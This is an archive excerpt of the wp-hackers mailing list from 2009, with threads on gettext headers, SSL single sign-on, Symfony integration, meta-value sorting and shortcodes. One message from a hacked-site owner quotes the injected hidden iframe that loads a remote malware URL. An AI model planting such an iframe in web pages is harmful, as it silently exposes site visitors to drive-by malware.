Subject: [wp-hackers] wordpress.org *.pot file feature for
	pluginsgetsbroken by PoEdit
In-Reply-To: <4A6661BF.5050808@code-styling.de>
References: <29107846.2446491248095658555.JavaMail.servlet@kundenserver> 
	<87e663fa0907210918u216705ban8c50fd3c0b79dd51@mail.gmail.com> 
	<4A6661BF.5050808@code-styling.de>
Message-ID: <87e663fa0907212256t3d6d3048p828daa73547a8bfb@mail.gmail.com>

On Wed, Jul 22, 2009 at 03:47, Heiko Rabe<heiko.rabe at code-styling.de> wrote:
>
>>> I know this. But the point is, that a lot of translation frameworks only
>>> based on normal gettext capabilities and also assume, that a rescan process
>>> can run every time on demand if required.
>>> Out of this scope this breaks all arround based on normal gettext
>>> behavoir.
>>> Any msgid not having a line number/file reference and can't be found by
>>> the gettext function definitions will be declared as obsolete.
>>>
>>>
>>
>> We can add line numbers if this causes a problem with the tools.
>>
>
> The Problem are not only the line number themselves, it the way gettext
> processors scanning sources.
> Even if there would be a line number attached, the scanner is unable to keep
> this at *.po file instead of trash it as absolete.
>

That's what I thought.

> But one thing for sure will be keeped by gettext processors, the header
> fields in msgid "" !
> ...
>
> you also could do the same as PoEdit did just for WordPress itself like:
>
> "X-WordPress-Plugin-Name: Custom Field Images\n"
> "X-WordPress-Plugin-Description: Easily associate any image to a post and
> display it in post excerpts, feeds etc.\n"
> ...
>
> and as new golden goal it would also work for gettextable themes, where you
> have currently no solution for:
>
> "X-WordPress-Theme-Name: My Super Theme\n"
> "X-WordPress-Theme-Description: This is the worlds best theme ever seen on
> earth.\n"
> ...
>
> I have written the proposed X-WordPress fields only english because of
> illustration but normally at a german file (de_DE.po) you would have german
> text there :-)
>
> This would be my proposal for keeping it inside the file and also can be
> keeped even if the files gets re-written by a new scan process.
> And because the header of a *.mo file get's processed dedicated (at least to
> get the pluralization formula and number) this fields could be extracted as
> easy as the plurals.

We can easily add the strings as headers, too.

The problem is that gettext editors don't give a interface to edit the headers.

Let's say the strings are lost from the POT file for some reason. In
order to recover them, you will have to open the POT file using a text
editor, copy the strings from the headers and put them into a
msgid/msgstr blocks. Just re-running the makepot script is easier and
less error-prone than that.

Happy hacking,
Nikolay.

From heiko.rabe at code-styling.de  Wed Jul 22 10:48:07 2009
From: heiko.rabe at code-styling.de (heiko.rabe at code-styling.de)
Date: Wed, 22 Jul 2009 12:48:07 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature
 forpluginsgetsbroken by PoEdit
Message-ID: <9199008.3028881248259687439.JavaMail.servlet@kundenserver>

Let me explain (beside the effect of not assisted by PoEdit to translated the fields) what benefit for loading and runtime this would give.

Let's say, we have a function like:

function i18n_load_plugininfo($textdomain, $path) { ... }

What does the function do (best case description for example) ?

1.) It searches as currenct the related *.mo file. 
2.) It loads the 28 bytes header and the searches the translation first entry (begin of trans table).
3.) it reads the first pair (size, offset) for the header translation.
4.) it seeks to the position of file and reads only size bytes from offset.
5.) it explodes string into a qualified header array.
6.) it returns the array with the header fields.

Because of specification of *.mo file format, the msgid table is sorted ASC and related to that fact are the trans string accordingly. That's why msgid "" is always trans table entry pair 0.

Doing so you would avoid loading the complete *.mo file into memory for purpose only to find strings to tranlate the plugin overview page. You only extract the header fields which are a few bytes instead of kBytes *.mo content. 

This will massively increase speed of processing and reduced signific the amount of memory needed to make this kind of translation.

The only remaining thing is, how to translate it with editors like PoEdit. But the aspects for speed and memory load should not be thrown away.

Heiko Rabe
(www.code-styling.de)

> "X-WordPress-Plugin-Name: Custom Field Images\n"
> "X-WordPress-Plugin-Description: Easily associate any image to a post and
> display it in post excerpts, feeds etc.\n"
> ...
>
> and as new golden goal it would also work for gettextable themes, where you
> have currently no solution for:
>
> "X-WordPress-Theme-Name: My Super Theme\n"
> "X-WordPress-Theme-Description: This is the worlds best theme ever seen on
> earth.\n"
> ...
>
> I have written the proposed X-WordPress fields only english because of
> illustration but normally at a german file (de_DE.po) you would have german
> text there :-)
>
> This would be my proposal for keeping it inside the file and also can be
> keeped even if the files gets re-written by a new scan process.
> And because the header of a *.mo file get's processed dedicated (at least to
> get the pluralization formula and number) this fields could be extracted as
> easy as the plurals.

We can easily add the strings as headers, too.

The problem is that gettext editors don't give a interface to edit the 
headers.

Let's say the strings are lost from the POT file for some reason. In
order to recover them, you will have to open the POT file using a text
editor, copy the strings from the headers and put them into a
msgid/msgstr blocks. Just re-running the makepot script is easier and
less error-prone than that.

From nb at nikolay.bg  Wed Jul 22 11:02:06 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Wed, 22 Jul 2009 14:02:06 +0300
Subject: [wp-hackers] wordpress.org *.pot file feature
	forpluginsgetsbroken by PoEdit
In-Reply-To: <9199008.3028881248259687439.JavaMail.servlet@kundenserver>
References: <9199008.3028881248259687439.JavaMail.servlet@kundenserver>
Message-ID: <87e663fa0907220402n2b547ba3o5d3ff8e021829a4f@mail.gmail.com>

On Wed, Jul 22, 2009 at 13:48, <heiko.rabe at code-styling.de> wrote:
> ...
> The only remaining thing is, how to translate it with editors like PoEdit. But the aspects for speed and memory load should not be thrown away.
>

They are not thrown away.

The plugins page might allocate too much memory only in one special
case: non-English blog on a host with very low memory limit and with
tens of plugins with large translations. There are probably a dozen of
such installs in the world.

I wouldn't put too much effort to optimize that. I would find a way to
disable the meta-data translations in the edge case.

If you want to spend time on this, you are more than welcome. A
working patch will be gladly accepted. It just has to be
backwards-compatible (old style plugin headers), shouldn't put strain
on plugin developers (setting the meta-data two times) or translators
(having to translate PO file headers).

Happy hacking,
Nikolay.

From wp-hackers at google-adsense-templates.co.uk  Wed Jul 22 11:37:16 2009
From: wp-hackers at google-adsense-templates.co.uk (AdSense Templates)
Date: Wed, 22 Jul 2009 12:37:16 +0100
Subject: [wp-hackers] comment_reply_link and nofollow attribute
Message-ID: <3ftd65p6eb8qb3jhdm4bues1ru24ibir1b@4ax.com>

Hi,

First post here, so apologies if I do something wrong :)

Have an SEO issue with the comment_reply_link function as it creates a
link with a nofollow attribute. Have tried to get this addressed
elsewhere:

http://wordpress.org/support/topic/287704?replies=1
http://codex.wordpress.org/Talk:Template_Tags/comment_reply_link

but no joy so far and it was suggested this mailing list might be a
better place to discus this.

Rather than repeating my points at the two URLs above I'll add if
WordPress development team won't remove the nofollow attribute I'm
looking for a fix to remove it at theme level, while maintaining the
Reply links.

It's easy to remove it from /wp-includes/comment-template.php but the
themes I want to update to use the comment_reply_link function on are
sold as search engine optimized themes and adding this is anti-seo and
expecting a WordPress user to hack core WordPress files is asking a
bit too much :)

David
-- 
Monetize your WordPress blog with Search Engine Optimized templates
including AdSense ads http://www.google-adsense-templates.co.uk/

From shacker at birdhouse.org  Wed Jul 22 22:00:04 2009
From: shacker at birdhouse.org (Scot Hacker)
Date: Wed, 22 Jul 2009 15:00:04 -0700
Subject: [wp-hackers] Single sign-on SSL domain
Message-ID: <695542FB-BB3A-40B7-859A-74FB3F9615F4@birdhouse.org>

I'm in a situation where all WP logins will need to go SSL. We have a  
lot of domains but not a lot of IP addresses to go around.  
Historically all of our domains have been vhosts on a single server.  
But since SSL requires one IP per domain, we're kind of stuck.

Two possibilities we're considering:

1) Require all logins to be OpenID, pushing the login process off to  
another server so we don't have to worry about it. The challenge here  
is that the existing OpenID plugin for WP does not provide a way to  
*force* OpenID logins. Submitted a ticket to that project asking for  
the feature, but no response in two weeks.

2) Somehow configure apache to route login requests to a central  
domain for sign-in. So:

ssldomain.edu  <-- has cert

Attempting to log in at domain.org would pass the user to  
ssldomain.edu for authentication and then back to domain.org. I  
believe I can use an apache Alias system so that the user would really  
be at ssldomain.edu/domain.org but would appear to be at domain.org.  
Has anyone tried something like this? Tricky? Successful? Pitfalls?  
Recipes to share? What would need to happen on the WP side to work  
with a system like this? Is it even possible?

3) Other... ?

Thanks for any suggestions.

Scot


From matt at sivel.net  Wed Jul 22 22:22:22 2009
From: matt at sivel.net (Matt Martz)
Date: Wed, 22 Jul 2009 18:22:22 -0400
Subject: [wp-hackers] Single sign-on SSL domain
Message-ID: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com>

What about using a wildcard cert or SAN (subject alternate name) cert?  A SAN cert allows you to protect multiple hostnames and domain names with a single cert. 

Scot Hacker <shacker at birdhouse.org> wrote:

>I'm in a situation where all WP logins will need to go SSL. We have a  
>lot of domains but not a lot of IP addresses to go around.  
>Historically all of our domains have been vhosts on a single server.  
>But since SSL requires one IP per domain, we're kind of stuck.
>
>Two possibilities we're considering:
>
>1) Require all logins to be OpenID, pushing the login process off to  
>another server so we don't have to worry about it. The challenge here  
>is that the existing OpenID plugin for WP does not provide a way to  
>*force* OpenID logins. Submitted a ticket to that project asking for  
>the feature, but no response in two weeks.
>
>2) Somehow configure apache to route login requests to a central  
>domain for sign-in. So:
>
>ssldomain.edu  <-- has cert
>
>Attempting to log in at domain.org would pass the user to  
>ssldomain.edu for authentication and then back to domain.org. I  
>believe I can use an apache Alias system so that the user would really  
>be at ssldomain.edu/domain.org but would appear to be at domain.org.  
>Has anyone tried something like this? Tricky? Successful? Pitfalls?  
>Recipes to share? What would need to happen on the WP side to work  
>with a system like this? Is it even possible?
>
>3) Other... ?
>
>Thanks for any suggestions.
>
>Scot
>
>_______________________________________________
>wp-hackers mailing list
>wp-hackers at lists.automattic.com
>http://lists.automattic.com/mailman/listinfo/wp-hackers

--
--
Matt Martz
matt at sivel.net

From jeremy at visser.name  Thu Jul 23 02:15:50 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 23 Jul 2009 12:15:50 +1000
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com>
References: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com>
Message-ID: <1248315350.4563.14.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-07-22 at 18:22 -0400, Matt Martz wrote:
> What about using a wildcard cert or SAN (subject alternate name) cert? 
> A SAN cert allows you to protect multiple hostnames and domain names
> with a single cert. 

Have you seen how much wildcard SSL certificates cost? Apart from CAcert
(which is free), all the registrars charge an arm and a leg for one.
Even GoDaddy charges nearly US$200 for one.

Plus the fact that they only work on subdomains.

I've heard of SAN certs, which do work with completely independent
domain names, but I've not looked into pricing or availability. I can
only guess they would be significantly more expensive than an ordinary
certificate.

Scot, if you estimate most of your users are not using IE on Windows XP,
you could look into TLS-SNI. It is supported on Apache with the
mod_gnutls module (instead of mod_ssl), and allows you to serve multiple
SSL certificates (i.e. with name-based virtual hosts) on a single IP
address.

Unfortunately, while TLS-SNI is supported on Linux, Mac OS X, and
Windows Vista, it is only supported on Windows XP if you use a
third-party browser like Firefox. If you use IE6, IE7, or IE8 on XP,
you'll get served the wrong certificate.

I guess you could do a user-agent check to serve IE+XP users a non-SSL
page, as punishment for their sins. Might be worth looking into.

On Wed, 2009-07-22 at 15:00 -0700, Scot Hacker wrote:
> Somehow configure apache to route login requests to a central  
> domain for sign-in. Has anyone tried something like this? Tricky?
> Successful? Pitfalls? Recipes to share? What would need to happen on
> the WP side to work with a system like this? Is it even possible?

I have envisaged this situation myself in the event that a client would
one day require SSL on a site. Presuming each of your WordPress blogs
are at the root of their respective domain, I'd start by symlinking each
domain into subdirectories of your SSL domain:

        [scot at localhost ~/ssldomain.edu]$ ln -s ~/domain.org .
        [scot at localhost ~/ssldomain.edu]$ ln -s ~/mydomain.com .
        [scot at localhost ~/ssldomain.edu]$ ln -s ~/somesite.edu .

Then, I'd edit the wp-config.php file for each, and dynamically set the
WP_HOME and WP_SITEURL constants based on the hostname provided:

        # Single-domain SSL support for domain.org
        if ('ssldomain.edu' == $_SERVER['HTTP_HOST']) {
            define('WP_HOME',    'http://ssldomain.edu/domain.org');
            define('WP_SITEURL', 'http://ssldomain.edu/domain.org');
        }

All your theme images, redirects, etc. would then be pointing to the SSL
domain.

Hope this helps,
Jeremy.


From wp at xentek.net  Thu Jul 23 09:19:24 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 23 Jul 2009 04:19:24 -0500
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <1248315350.4563.14.camel@rillian.narnia.sunriseroad.net>
References: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com>
	<1248315350.4563.14.camel@rillian.narnia.sunriseroad.net>
Message-ID: <650F2917-4E61-436F-BC8F-2649F7068311@xentek.net>

Check out startssl.com for cheaper certs (including standard ones for  
free). You'll need to jump through a few hoops, and know how to use  
Client certficate to authenticate to the site. Its easy once you do it  
once.

In addition if you have the ability to configure your server(s) more  
directly, you may also be able to set up a reverse proxy to handle  
your SSL across your sites: http://wiki.squid-cache.org/ConfigExamples/Reverse/SslWithWildcardCertifiate

-e

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From glenn at glennansley.com  Thu Jul 23 13:53:57 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Thu, 23 Jul 2009 09:53:57 -0400
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <650F2917-4E61-436F-BC8F-2649F7068311@xentek.net>
References: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com> 
	<1248315350.4563.14.camel@rillian.narnia.sunriseroad.net> 
	<650F2917-4E61-436F-BC8F-2649F7068311@xentek.net>
Message-ID: <3283f0830907230653w72d2e56bu90c834a590ada414@mail.gmail.com>

If this problem was tasked to me, I would probably explore using the
CUSTOM_USER_TABLE and CUSTOM_USER_META_TABLE constants [1] along with
the SET_COOKIE_DOMAIN constant [2].

If all your installs have access to the same MySQL server, the user
tables won't be a problem. The COOKIES shouldn't be a problem either.
A user is deemed logged in or not logged in based on COOKIES. You
would just have to make sure that a) Your authentications blog set the
COOKIE correct, b) that your other blogs looked for the correct COOKIE
to determine whether or not the user was logged in and c) all your
salts were set the same across all blogs [3].

FullThrottle recently did something very similar for a client and
documented it on our blog [4]. We weren't using SSL to login... but
that shouldn't matter since you will only be handling logins from one
blog.

Bonus points: On all your actual blogs, redirect any requests for the
login page to your SSL login along with a referral query. Then send
them back after they're logged in via the SSL blog.

I'm sure there's some hurdles to jump there as I've never done this
exact thing, but that's how I would proceed.

[1] http://codex.wordpress.org/Editing_wp-config.php#Custom_User_and_Usermeta_Tables
[2] http://codex.wordpress.org/Editing_wp-config.php#Set_Cookie_Domain
[3] http://codex.wordpress.org/Editing_wp-config.php#Security_Keys
[4] http://fullthrottledevelopment.com/setting-a-single-login-across-wp-wpmu

Glenn Ansley
Owner / Developer | FullThrottle Development, LLC
http://fullthrottledevelopment.com
http://twitter.com/full_throttle
(919) 522-1532



On Thu, Jul 23, 2009 at 5:19 AM, Eric Marden<wp at xentek.net> wrote:
> Check out startssl.com for cheaper certs (including standard ones for free).
> You'll need to jump through a few hoops, and know how to use Client
> certficate to authenticate to the site. Its easy once you do it once.
>
> In addition if you have the ability to configure your server(s) more
> directly, you may also be able to set up a reverse proxy to handle your SSL
> across your sites:
> http://wiki.squid-cache.org/ConfigExamples/Reverse/SslWithWildcardCertifiate
>
> -e
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
>
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at tekartist.org  Thu Jul 23 15:54:15 2009
From: wordpress at tekartist.org (Stephane Daury)
Date: Thu, 23 Jul 2009 11:54:15 -0400
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <3283f0830907230653w72d2e56bu90c834a590ada414@mail.gmail.com>
References: <xud3rfjdqgayh3d8p0ruli91.1248301342837@email.android.com>
	<1248315350.4563.14.camel@rillian.narnia.sunriseroad.net>
	<650F2917-4E61-436F-BC8F-2649F7068311@xentek.net>
	<3283f0830907230653w72d2e56bu90c834a590ada414@mail.gmail.com>
Message-ID: <D52549C8-A409-4D88-A62D-0FD61C35D921@tekartist.org>


Oh boy, you're in a world of pain on this one, especially if you have  
a lot of domains (not subdomains), which the wildcard cert won't help  
you with. Uou'd also still have the IP-per-host requirement,  
regardless of if it's a wildcard or not.

Anyway, one (hopefully) constructive solution I could offer would be  
for you to look into having your users managed in an LDAP server  
instead, then run an WP-to-LDAP auth plugin like http://wordpress.org/extend/plugins/wpdirauth 
  (which btw also has an option to force WP to serve the login screen  
under SSL).

This is how I was dealing with this when working for a large  
university, faced with the same issues as you currently are. What  
happens is that the login form is still WP's, but it hits the LDAP  
server in the back with the provided credentials when it doesn;t find  
a matching user in the WP tables. So all you have to do (beyond  
maintaining an LDAP server...) is *simply* not create and/or port your  
existing WP users to LDAP, and you're done.

The big question here is: are your users supposed to be able to  
register on their own, or are they provided with single sign-on  
credentials that work everywhere (like enterprise users would be)? The  
above LDAP plugin of course only handles login, not registration.

BTW: in regards to forcing OpenID: one reason they haven't replied  
might be that (up until recently?) WP will only let us extend the  
login form, not replace its core behavior. You could hack it to remove  
the WP login fields, but that'd mean hacking core files, which I would  
never advise to do. Note that this might change in the future, since  
changes to the auth system in WP 2.8 make it possible to overcome this  
issue, thanks to Will Norris' work: http://willnorris.com/2009/03/authentication-in-wordpress-28

Anyway, here were my two cents. Hoping it might be of help. :)

Cheers,

Stephane Daury

On Jul 23, 2009, at 9:53, Glenn Ansley wrote:

> If this problem was tasked to me, I would probably explore using the
> CUSTOM_USER_TABLE and CUSTOM_USER_META_TABLE constants [1] along with
> the SET_COOKIE_DOMAIN constant [2].
>
> If all your installs have access to the same MySQL server, the user
> tables won't be a problem. The COOKIES shouldn't be a problem either.
> A user is deemed logged in or not logged in based on COOKIES. You
> would just have to make sure that a) Your authentications blog set the
> COOKIE correct, b) that your other blogs looked for the correct COOKIE
> to determine whether or not the user was logged in and c) all your
> salts were set the same across all blogs [3].
>
> FullThrottle recently did something very similar for a client and
> documented it on our blog [4]. We weren't using SSL to login... but
> that shouldn't matter since you will only be handling logins from one
> blog.
>
> Bonus points: On all your actual blogs, redirect any requests for the
> login page to your SSL login along with a referral query. Then send
> them back after they're logged in via the SSL blog.
>
> I'm sure there's some hurdles to jump there as I've never done this
> exact thing, but that's how I would proceed.
>
> [1] http://codex.wordpress.org/Editing_wp-config.php#Custom_User_and_Usermeta_Tables
> [2] http://codex.wordpress.org/Editing_wp-config.php#Set_Cookie_Domain
> [3] http://codex.wordpress.org/Editing_wp-config.php#Security_Keys
> [4] http://fullthrottledevelopment.com/setting-a-single-login-across-wp-wpmu
>
> Glenn Ansley
> Owner / Developer | FullThrottle Development, LLC
> http://fullthrottledevelopment.com
> http://twitter.com/full_throttle
> (919) 522-1532
>
>
>
> On Thu, Jul 23, 2009 at 5:19 AM, Eric Marden<wp at xentek.net> wrote:
>> Check out startssl.com for cheaper certs (including standard ones  
>> for free).
>> You'll need to jump through a few hoops, and know how to use Client
>> certficate to authenticate to the site. Its easy once you do it once.
>>
>> In addition if you have the ability to configure your server(s) more
>> directly, you may also be able to set up a reverse proxy to handle  
>> your SSL
>> across your sites:
>> http://wiki.squid-cache.org/ConfigExamples/Reverse/SslWithWildcardCertifiate
>>
>> -e
>>
>> - Eric Marden
>> __________________________________
>> http://xentek.net/code/wordpress/
>>
>>
>>
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From doki_pen at doki-pen.org  Thu Jul 23 19:44:14 2009
From: doki_pen at doki-pen.org (doki_pen)
Date: Thu, 23 Jul 2009 15:44:14 -0400
Subject: [wp-hackers] Symfony / Wordpress Integration
Message-ID: <4A68BD8E.80205@doki-pen.org>

I'm trying to integrate wordpress into symfony.  I'm following the advice here: http://www.theodo.fr/blog/2009/03/integrate-wordpress-into-symfony/

I'm getting the following error:

Fatal error:  Call to a member function register() on a non-object in /home/rcorsaro/storage/src/wordpress-test/apps/main/modules/blog/lib/vendor/wordpress/wp-includes/widgets.php on line 427

I'm doing this on a fresh symfony install.   If I can wordpress' index.php from the shell, it outputs properly, but when I require_once from inside my symfony controller, it gives me the widgets error.  I tried going through the code, but it moves around a lot.  Any idea why things are not being initialized properly?

using wordpress 2.8.


From otto at ottodestruct.com  Thu Jul 23 19:54:58 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 23 Jul 2009 14:54:58 -0500
Subject: [wp-hackers] Symfony / Wordpress Integration
In-Reply-To: <4A68BD8E.80205@doki-pen.org>
References: <4A68BD8E.80205@doki-pen.org>
Message-ID: <161617690907231254h5adaf510xf1b01550e2617311@mail.gmail.com>

What file is it that you're require_onceing? It should be the
wp-blog-header.php file.

-Otto
Sent from Memphis, TN, United States


On Thu, Jul 23, 2009 at 2:44 PM, doki_pen<doki_pen at doki-pen.org> wrote:
> I'm trying to integrate wordpress into symfony. ?I'm following the advice
> here: http://www.theodo.fr/blog/2009/03/integrate-wordpress-into-symfony/
>
> I'm getting the following error:
>
> Fatal error: ?Call to a member function register() on a non-object in
> /home/rcorsaro/storage/src/wordpress-test/apps/main/modules/blog/lib/vendor/wordpress/wp-includes/widgets.php
> on line 427
>
> I'm doing this on a fresh symfony install. ? If I can wordpress' index.php
> from the shell, it outputs properly, but when I require_once from inside my
> symfony controller, it gives me the widgets error. ?I tried going through
> the code, but it moves around a lot. ?Any idea why things are not being
> initialized properly?
>
> using wordpress 2.8.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From doki_pen at doki-pen.org  Thu Jul 23 19:57:32 2009
From: doki_pen at doki-pen.org (doki_pen)
Date: Thu, 23 Jul 2009 15:57:32 -0400
Subject: [wp-hackers] Symfony / Wordpress Integration
In-Reply-To: <161617690907231254h5adaf510xf1b01550e2617311@mail.gmail.com>
References: <4A68BD8E.80205@doki-pen.org>
	<161617690907231254h5adaf510xf1b01550e2617311@mail.gmail.com>
Message-ID: <4A68C0AC.50209@doki-pen.org>

Otto wrote:
> What file is it that you're require_onceing? It should be the
> wp-blog-header.php file.
>   
Yes, I tried wp-blog-header.php and index.php for s&g.
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Thu, Jul 23, 2009 at 2:44 PM, doki_pen<doki_pen at doki-pen.org> wrote:
>   
>> I'm trying to integrate wordpress into symfony. ?I'm following the advice
>> here: http://www.theodo.fr/blog/2009/03/integrate-wordpress-into-symfony/
>>
>> I'm getting the following error:
>>
>> Fatal error: ?Call to a member function register() on a non-object in
>> /home/rcorsaro/storage/src/wordpress-test/apps/main/modules/blog/lib/vendor/wordpress/wp-includes/widgets.php
>> on line 427
>>
>> I'm doing this on a fresh symfony install. ? If I can wordpress' index.php
>> from the shell, it outputs properly, but when I require_once from inside my
>> symfony controller, it gives me the widgets error. ?I tried going through
>> the code, but it moves around a lot. ?Any idea why things are not being
>> initialized properly?
>>
>> using wordpress 2.8.
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   


From navjotjsingh at gmail.com  Thu Jul 23 20:31:14 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Fri, 24 Jul 2009 02:01:14 +0530
Subject: [wp-hackers] Default.widgets.php Hacked? What to do?
Message-ID: <7b9e108c0907231331u585e893bt81dd0082579bf87a@mail.gmail.com>

I have a blog running on 2.8.2 and suddenly now I find all index.php
and wp-includes/Default.widgets.php hacked with following code
inserted randomly :

<iframe src="http://u1j.in:8080/ts/in.cgi?pepsi109" width=125
height=125 style="visibility: hidden"></iframe>

How to prevent further hacking? I am currently replacing all the files
affected since all of them affected at a certain date. I am on a
shared hosting and only one blog got attacked.

Regards
Navjot Singh

From gwkgarchive at gmail.com  Thu Jul 23 21:05:46 2009
From: gwkgarchive at gmail.com (Gwkg Archive)
Date: Thu, 23 Jul 2009 17:05:46 -0400
Subject: [wp-hackers] Sorting Posts By Custom Meta Value
Message-ID: <270547670907231405m33cd9d02h67147674bd5af00f@mail.gmail.com>

Ok I'm doing pretty good digging through the Wordpress Code and adding some
functionality to a theme.  Heres what I did so far

1. Made one of my categories a Directory with its own template
(category-9.php)

2. Added a drop-down box for posts in the Admin that lets the admin set a
meta_key verification_level with a value of 0, 1, 2 or 3

I want to sort on that value and I'm having a hard time figuring it out.

A couple things <em>almost</em> worked like adding a post_join filter

" JOIN wp_postmeta ON wp_posts.ID = wp_postmeta.post_id";

but that was returning duplicated posts

The closest (and easiest) mod was adding this line in category-9.php

$posts = query_posts(
"meta_key=verification_value&orderby=meta_value&order=desc" );

but the problem is a lot of posts don't have the verification_value set and
aren't being shown from that

What's the best way to grab the posts without a value set in that meta_key
and add them to the end of the post array without actually setting that
value in the database?

From scribu at gmail.com  Thu Jul 23 21:30:20 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 00:30:20 +0300
Subject: [wp-hackers] Sorting Posts By Custom Meta Value
In-Reply-To: <270547670907231405m33cd9d02h67147674bd5af00f@mail.gmail.com>
References: <270547670907231405m33cd9d02h67147674bd5af00f@mail.gmail.com>
Message-ID: <349fe48b0907231430l2d90b708jf2fa6a7194bc7166@mail.gmail.com>

>
> " JOIN wp_postmeta ON wp_posts.ID = wp_postmeta.post_id";
>
> but that was returning duplicated posts


You can add a GROUP BY wp_posts.ID to remove the duplicates.


-- 
http://scribu.net

From scribu at gmail.com  Thu Jul 23 21:35:00 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 00:35:00 +0300
Subject: [wp-hackers] Sorting Posts By Custom Meta Value
In-Reply-To: <349fe48b0907231430l2d90b708jf2fa6a7194bc7166@mail.gmail.com>
References: <270547670907231405m33cd9d02h67147674bd5af00f@mail.gmail.com>
	<349fe48b0907231430l2d90b708jf2fa6a7194bc7166@mail.gmail.com>
Message-ID: <349fe48b0907231435v356f7729vcf62808c3db93395@mail.gmail.com>

>
> What's the best way to grab the posts without a value set in that meta_key
> and add them to the end of the post array without actually setting that
> value in the database?
>

You could make the select look like this:

SELECT ..., IFNULL(meta_value, 0) ...

This will replace null values with 0.


-- 
http://scribu.net

From jane at automattic.com  Thu Jul 23 22:14:13 2009
From: jane at automattic.com (Jane Wells)
Date: Thu, 23 Jul 2009 18:14:13 -0400
Subject: [wp-hackers] IRC Dev Chat: New Day/Time
In-Reply-To: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
References: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
Message-ID: <D57CC145-BF01-4604-B98E-11685BD376D2@automattic.com>

Hi everyone. Just wanted to let you know that the day/time of the IR  
#wordpress-dev dev chat is moving as of next week to Thursdays at 9PM  
UTC. This change comes as an accommodation to European schedules. If  
you haven't attended a dev chat lately, stop by sometime. We've gotten  
fairly organized, and post about agenda topics during the week leading  
up to each chat at http://wpdevel.wordpress.com. The last few chats  
have been very productive, and we've generally got at least 2 of the  
core devs in attendance, if not more. Some big issues are coming up  
over the next few weeks and as we get into the 2.9 dev cycle, so the  
chats are sure to be lively.

If you do attend, please remember to be nice to people, and feel free  
to suggest an agenda item at http://wpdevel.wordpress.com. We post the  
agenda at the beginning of the chat, and go through items in order,  
with some time at the end for general discussion of anything that  
didn't make the agenda that week.

So mark your calendars for Thursdays at 9pm UTC!
Jane

Jane Wells
User Experience
Automattic | WordPress

From hal at burgiss.net  Thu Jul 23 22:44:58 2009
From: hal at burgiss.net (Hal Burgiss)
Date: Thu, 23 Jul 2009 18:44:58 -0400
Subject: [wp-hackers] Default.widgets.php Hacked? What to do?
In-Reply-To: <7b9e108c0907231331u585e893bt81dd0082579bf87a@mail.gmail.com>
References: <7b9e108c0907231331u585e893bt81dd0082579bf87a@mail.gmail.com>
Message-ID: <20090723224458.GC24079@honey.burgiss.net>

On Fri, Jul 24, 2009 at 02:01:14AM +0530, Navjot Singh wrote:
> 
> How to prevent further hacking? I am currently replacing all the files

And what were the file permissions? 

-- 
Hal

From bryanharley at gmail.com  Thu Jul 23 22:47:44 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Thu, 23 Jul 2009 15:47:44 -0700
Subject: [wp-hackers] Shortcodes stopped working after 2.8.2
Message-ID: <58410e2e0907231547h73275629k6eae053367a94a13@mail.gmail.com>

Some of my short codes aren't working in 2.8.2.  It's weird, some work
but some don't.  Anyone know what the problem might be?

All I'm doing is stuff like this...


function service_hc() {
return '<li><a href="URL">Health Care</a></li>';
}

function service_merg() {
return '<li><a href="URL">Mergers &#038; Acquisitions</a></li>';
}

add_shortcode('hc', 'service_hc');
add_shortcode('merg', 'service_merg');

From bryanharley at gmail.com  Thu Jul 23 23:14:44 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Thu, 23 Jul 2009 16:14:44 -0700
Subject: [wp-hackers] Shortcodes stopped working after 2.8.2
In-Reply-To: <58410e2e0907231547h73275629k6eae053367a94a13@mail.gmail.com>
References: <58410e2e0907231547h73275629k6eae053367a94a13@mail.gmail.com>
Message-ID: <58410e2e0907231614j2403322eu8fc7202505a4a96c@mail.gmail.com>

Actually, I should say 2.8 broke it.  I reverted back to 2.7.1 and the
shortcodes are working again.


On Thu, Jul 23, 2009 at 3:47 PM, Bryan Harley<bryanharley at gmail.com> wrote:
> Some of my short codes aren't working in 2.8.2. ?It's weird, some work
> but some don't. ?Anyone know what the problem might be?
>
> All I'm doing is stuff like this...
>
>
> function service_hc() {
> return '<li><a href="URL">Health Care</a></li>';
> }
>
> function service_merg() {
> return '<li><a href="URL">Mergers &#038; Acquisitions</a></li>';
> }
>
> add_shortcode('hc', 'service_hc');
